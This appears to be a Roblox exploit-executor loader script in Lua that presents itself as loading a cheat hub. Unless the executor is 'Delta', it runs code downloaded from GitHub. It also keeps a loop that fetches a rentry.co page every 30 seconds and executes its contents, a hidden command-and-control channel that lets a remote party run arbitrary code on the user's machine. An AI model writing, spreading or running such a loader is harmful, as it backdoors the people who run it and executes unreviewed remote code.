if identifyexecutor and identifyexecutor():lower():find("delta") then
    print("Hello")
else
    spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base.lua"))();
    end)
    spawn(function()
        while true do
            task.wait(30)
            local request = http_request or request or syn.request
            local HttpService = game:GetService("HttpService")

            -- Fetch the Rentry page (HTML version)
            local res = request({
                Url = "https://rentry.co/vqafnmu2",
                Method = "GET"
            })

            -- Extract <p> content from HTML
            local html = res.Body
            local content = string.match(html, "<p>(.-)</p>")

            -- Decode HTML entities if needed
            content = content:gsub("&quot;", "\""):gsub("&#39;", "'")

            -- Run the content as Lua code
            local func, err = loadstring(content)
            if func then
                func()
            else
                warn("Error compiling code:", err)
            end


            if username == game.Players.LocalPlayer.Name then
                loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/autotest.lua"))();
            end
        end
    end)
end


loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))();
